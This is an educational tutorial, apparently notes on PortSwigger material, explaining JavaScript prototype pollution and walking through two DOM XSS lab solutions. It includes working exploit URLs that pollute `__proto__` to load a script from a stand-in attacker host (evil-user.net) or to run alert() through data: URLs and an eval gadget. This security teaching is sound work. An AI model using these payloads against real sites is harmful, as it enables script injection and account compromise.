
---

## What is prototype pollution?## What is prototype pollution?

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.![[prototype-pollution-infographic.svg]]

Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution.

## What is an object in JavaScript?

A JavaScript object is essentially just a collection of `key:value` pairs known as "properties". For example, the following object could represent a user:
``` js
const user = { 
username: "wiener",
 userId: 01234,
  isAdmin: false 
}
```

We can access the properties of an object by using either dot notation or bracket notation to refer to their respective keys: 
```js
user.username // "wiener"
user['userId'] // 01234
```

As well as data, properties may also contain executable functions. In this case, the function is known as a "method":

``` js
const user = {
 username: "wiener",
 userId: 01234,
 exampleMethod: function(){
 // do something
  } 
}
```

The example above is an "object literal", which means it was created using curly brace syntax to explicitly declare its properties and their initial values. However, it's important to understand that almost everything in JavaScript is an object under the hood. Throughout these materials, the term "object" refers to all entities, not just object literals.

## What is a prototype in JavaScript?

Every object in JavaScript is linked to another object of some kind, known as its prototype. By default, JavaScript automatically assigns new objects one of its built-in prototypes. For example, strings are automatically assigned the built-in `String.prototype`. We can see some more examples of these global prototypes below:

```js
let myObject = {}; Object.getPrototypeOf(myObject); // Object.prototype
 let myString = ""; Object.getPrototypeOf(myString); // String.prototype
  let myArray = []; Object.getPrototypeOf(myArray); // Array.prototype
   let myNumber = 1; Object.getPrototypeOf(myNumber); // Number.prototype
```

Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. This enables developers to create new objects that can reuse the properties and methods of existing objects.

The built-in prototypes provide useful properties and methods for working with basic data types. For example, the `String.prototype` object has a `toLowerCase()` method. As a result, all strings automatically have a ready-to-use method for converting them to lowercase. This saves developers having to manually add this behavior to each new string that they create.

## How does object inheritance work in JavaScript?

Whenever we reference a property of an object, the JavaScript engine first tries to access this directly on the object itself. If the object doesn't have a matching property, the JavaScript engine looks for it on the object's prototype instead. Given the following objects, this enables us to reference `myObject.propertyA`, for example:
![[prototype-pollution-inheritance.svg]]

We can use our browser console to see this behavior in action. First, we create a completely empty object: `let myObject = {};`
Next, we type `myObject` followed by a dot. Notice that the console prompts us to select from a list of properties and methods:
![[Pasted image 20251117201111.png]]

Even though there are no properties or methods defined for the object itself, it has inherited some from the built-in `Object.prototype`.

## The prototype chain

Note that an object's prototype is just another object, which should also have its own prototype, and so on. As virtually everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level `Object.prototype`, whose prototype is simply `null`
![[prototype-pollution-prototype-chain.svg]]

Crucially, objects inherit properties not just from their immediate prototype, but from all objects above them in the prototype chain. In the example above, this means that the `username` object has access to the properties and methods of both `String.prototype` and `Object.prototype`.

## Accessing an object's prototype using `__proto__`

Every object has a special property that we can use to access its prototype. Although this doesn't have a formally standardized name, `__proto__` is the de facto standard used by most browsers. If we're familiar with object-oriented languages, this property serves as both a getter and setter for the object's prototype. This means we can use it to read the prototype and its properties, and even reassign them if necessary.

As with any property, we can access `__proto__` using either bracket or dot notation:
```js
username.__proto__
 username['__proto__']
```

We can even chain references to `__proto__` to work our way up the prototype chain:
```js
username.__proto__ //String.prototype 
username.__proto__.__proto__ // Object.prototype 
username.__proto__.__proto__.__proto__ // null
```

## Modifying prototypes

Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object. This means developers can customize or override the behavior of built-in methods, and even add new methods to perform useful operations.

For example, modern JavaScript provides the `trim()` method for strings, which enables us to easily remove any leading or trailing whitespace. Before this built-in method was introduced, developers sometimes added their own custom implementation of this behavior to the `String.prototype` object by doing something like this:
```js
String.prototype.removeWhitespace = function(){
 // remove leading and trailing whitespace
 }
```

Thanks to the prototypal inheritance, all strings would then have access to this method:

```js
let searchTerm = " example ";
 searchTerm.removeWhitespace(); // "example"
```

## How do prototype pollution vulnerabilities arise?

Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested properties.

Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.

It's possible to pollute any prototype object, but this most commonly occurs with the built-in global `Object.prototype`.

Successful exploitation of prototype pollution requires the following key components:

- A prototype pollution source - This is any input that enables us to poison prototype objects with arbitrary properties.
- A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
- An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

## Prototype pollution sources

A prototype pollution source is any user-controllable input that enables us to add arbitrary properties to prototype objects. The most common sources are as follows:

- The URL via either the query or fragment string (hash)
- JSON-based input
- Web messages

## Prototype pollution via the URL

Consider the following URL, which contains an attacker-constructed query string: `https://vulnerable-website.com/?__proto__[evilProperty]=payload`

When breaking the query string down into `key:value` pairs, a URL parser may interpret `__proto__` as an arbitrary string. But let's look at what happens if these keys and values are subsequently merged into an existing object as properties.

We might think that the `__proto__` property, along with its nested `evilProperty`, will just be added to the target object as follows:

```
{ existingProperty1: 'foo',
 existingProperty2: 'bar',
  __proto__: {
   evilProperty: 'payload'
    }
 }
```

However, this isn't the case. At some point, the recursive merge operation may assign the value of `evilProperty` using a statement equivalent to the following:  `targetObject.__proto__.evilProperty = 'payload';`

During this assignment, the JavaScript engine treats `__proto__` as a getter for the prototype. As a result, `evilProperty` is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default `Object.prototype`, all objects in the JavaScript runtime will now inherit `evilProperty`, unless they already have a property of their own with a matching key.

In practice, injecting a property called `evilProperty` is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries

## Prototype pollution via JSON input

User-controllable objects are often derived from a JSON string using the `JSON.parse()` method. Interestingly, `JSON.parse()` also treats any key in the JSON object as an arbitrary string, including things like `__proto__`. This provides another potential vector for prototype pollution.

Let's say an attacker injects the following malicious JSON, for example, via a web message:

```json
{
 "__proto__": { 
 "evilProperty": "payload" 
    }
}
```

If this is converted into a JavaScript object via the `JSON.parse()` method, the resulting object will in fact have a property with the key `__proto__`:
```js
const objectLiteral = {__proto__: {evilProperty: 'payload'}}; const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}'); objectLiteral.hasOwnProperty('__proto__'); // false  
objectFromJson.hasOwnProperty('__proto__'); // true

```
If the object created via `JSON.parse()` is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example.

## Prototype pollution sinks

A prototype pollution sink is essentially just a JavaScript function or DOM element that we're able to access via prototype pollution, which enables us to execute arbitrary JavaScript or system commands.

As prototype pollution lets us control properties that would otherwise be inaccessible, this potentially enables us to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.

## Prototype pollution gadgets

A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:

- Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
- Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version we're able to add to the prototype. Robust websites may also explicitly set the prototype of the object to `null`, which ensures that it doesn't inherit any properties at all.

## Example of a prototype pollution gadget

Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this: `let transport_url = config.transport_url || defaults.transport_url;`

Now imagine the library code uses this `transport_url` to add a script reference to the page:

```js
let script = document.createElement('script');
 script.src = `${transport_url}/example.js`; document.body.appendChild(script);
```

If the website's developers haven't set a `transport_url` property on their `config` object, this is a potential gadget. In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by the `config` object and, therefore, set as the `src` for this script to a domain of the attacker's choosing.

If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain: `https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

By providing a `data:` URL, an attacker could also directly embed an XSS payload within the query string as follows: `https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

Note that the trailing `//` in this example is simply to comment out the hardcoded `/example.js` suffix.

## Finding client-side prototype pollution sources manually

Finding prototype pollution sources manually is largely a case of trial and error. In short, we need to try different ways of adding an arbitrary property to `Object.prototype` until we find a source that works.

When testing for client-side vulnerabilities, this involves the following high-level steps:

1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:`vulnerable-website.com/?__proto__[foo]=bar`
2. In our browser console, inspect `Object.prototype` to see if we have successfully polluted it with our arbitrary property: 
```js
Object.prototype.foo // "bar" indicates that we have successfully polluted the prototype // undefined indicates that the attack was not successful
```

3. If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa: `vulnerable-website.com/?__proto__.foo=bar`
4. Repeat this process for each potential source.


#### <u>Tip</u>

If neither of these techniques is successful, we may still be able to pollute the prototype via its constructor. We'll cover how to do this in more detail later.

## Finding client-side prototype pollution sources using DOM Invader

As we can see, finding prototype pollution sources manually can be a fairly tedious process. Instead, it is recommend to use DOM Invader, which comes preinstalled with Burp's built-in browser. DOM Invader is able to automatically test for prototype pollution sources as our browse, which can save us a considerable amount of time and effort.

## Finding client-side prototype pollution gadgets manually

Once we've identified a source that lets us add arbitrary properties to the global `Object.prototype`, the next step is to find a suitable gadget that we can use to craft an exploit. In practice, it is recommend to use DOM Invader to do this, but it's useful to look at the manual process as it may help solidify our understanding of the vulnerability.

1. Look through the source code and identify any properties that are used by the application or any libraries that it imports.
2. In Burp, enable response interception (**Proxy > Options > Intercept server responses**) and intercept the response containing the JavaScript that we want to test.
3. Add a `debugger` statement at the start of the script, then forward any remaining requests and responses.
4. In Burp's browser, go to the page on which the target script is loaded. The `debugger` statement pauses execution of the script.
5. While the script is still paused, switch to the console and enter the following command, replacing `OUR-PROPERTY` with one of the properties that we think is a potential gadget:
```js
Object.defineProperty(Object.prototype, 'OUR-PROPERTY', {
 get() {
  console.trace(); return 'polluted';
   }
 })
```

 The property is added to the global `Object.prototype`, and the browser will log a stack trace to the console whenever it is accessed.
6. Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application.
7. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
8. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as `innerHTML` or `eval()`.
9. Repeat this process for any properties that we think are potential gadgets.

## Finding client-side prototype pollution gadgets using DOM Invader

As we can see from the previous steps, manually identifying prototype pollution gadgets in the wild can be a laborious task. Given that websites often rely on a number of third-party libraries, this may involve reading through thousands of lines of minified or obfuscated code, which makes things even trickier. DOM Invader can automatically scan for gadgets on our behalf and can even generate a DOM XSS proof-of-concept in some cases. This means we can find exploits on real-world sites in a matter of seconds rather than hours.

## Lab: DOM XSS via client-side prototype pollution


This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.

You can solve this lab manually in your browser, or use DOM Invader to help you.

We will start the BurpSuite built-in browser and access the lab.

we will try to pollute a prototype of new objects by URL injection. We will add this to the end of the URL: `/?__proto__.payload=evil`

We will enter this URL and the page will reload. Then, we access the console tab by inspecting the page. In console, we will create a new JS object and then we will call it: 
```js
let newObject={}
newObject
```

If we expanded the results, we will see that we couldn't pollute the prototype.

We will try this way instead. In the URL:`/?__proto__[payload]=evil`

After creating a new object and calling it, we find that the prototype has been polluted.

Since we have discovered the vulnerability we need to solve this lab, we will check the JS files used in this website and try to exploit the code.

We will find what we are looking for if we went to Source tab. The JS file is called searchLogger.js. We will notice an interesting part of this code: 
```js
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```


This code reads the current page’s URL parameters, converts them into an object, and then checks whether a parameter called **`transport_url`** exists—either directly or through prototype inheritance if prototype pollution is possible. If this value is present, the function dynamically creates a `<script>` element, sets its `src` attribute to whatever URL was supplied, and appends it to the page’s DOM. As a result, the browser automatically loads and executes an external JavaScript file from the user-controlled `transport_url` value, making this function vulnerable to remote code execution via XSS when we can manipulate or pollute the `transport_url` property.

To take an advantage of this, we will put this in the URL: `/?__proto__[transport_url]=data:,alert(1);//`

This will give us an alert solving the lab.

For automated solution:https://www.youtube.com/watch?v=EBFYj91C4Pw&t=268s

---

## Lab: DOM XSS via an alternative prototype pollution vector

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.

You can solve this lab manually in your browser, or use DOM Invader to help you.

First, we will try to pollute prototypes of objects by adding this to the end of the URL: `/?__proto__[payload]=evil`. We will create a new object using the console tab in Inspect as we did in the previous lab. After we call the object, we can see that the prototype was not polluted. 
We will try this instead: `/?__proto__.payload=evil`. This will pollute the prototype.

Since we found that this website is vulnerable to prototype pollution, we need to find a gadget that calls our polluted prototype. We will find this gadget in this JS file that we can access in Resources: searchLoggerAlternative.js . The vulnerable code will in line 18 where the function eval is used to call manager.sequence. 

The use of eval is considered dangerous because it runs string as JS code. For example, this code: `eval("console.log(2 + 3)");` will result in output of 5.

We will try to pollute the prototype sequence: `/?__proto__.sequence=evil`

We can also put a debugger breakpoint on line 18. If we hovered with our mouse on manager.sequence, we will get this: evil1. We will try to call the alert function: `/?__proto__.sequence=alert()`

This will not give us the alert because of this part of the code:
```js
 let a = manager.sequence || 1;
    manager.sequence = a + 1;
```

This part declares variable a and gives it the value of manager.sequence or give it the value of 1 if manager.sequence is not declared. Then, it makes manager.sequence equal to variable a and adds 1 to it. 

Since that we declare manager.sequence to be alert(), the value of is going to be the same: alert().
The second line concatenate the 1 to alert() as a string:`alert()1`, which is not a valid syntax

To get the alert function to execute, we need to add one of these operations at the end of our URL:`-,*,/` This will result in a valid syntax when executing the code and the alert pop up to show up.




